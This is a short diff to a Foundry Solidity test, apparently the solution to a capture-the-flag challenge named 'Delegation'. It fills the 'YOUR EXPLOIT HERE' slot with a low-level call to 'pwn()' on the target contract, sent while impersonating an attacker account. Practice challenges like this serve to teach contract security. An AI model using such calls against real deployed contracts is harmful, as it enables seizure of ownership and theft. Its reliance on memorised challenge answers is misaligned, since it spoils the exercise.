@@ -36,7 +36,8 @@ contract DelegationTest is Test {
         vm.startPrank(attacker);
 
         // ========== YOUR EXPLOIT HERE ==========
-
+        (bool ok,) = address(target).call(abi.encodeWithSignature("pwn()"));
+        require(ok);
         // ========== END EXPLOIT ==========
 
         vm.stopPrank();
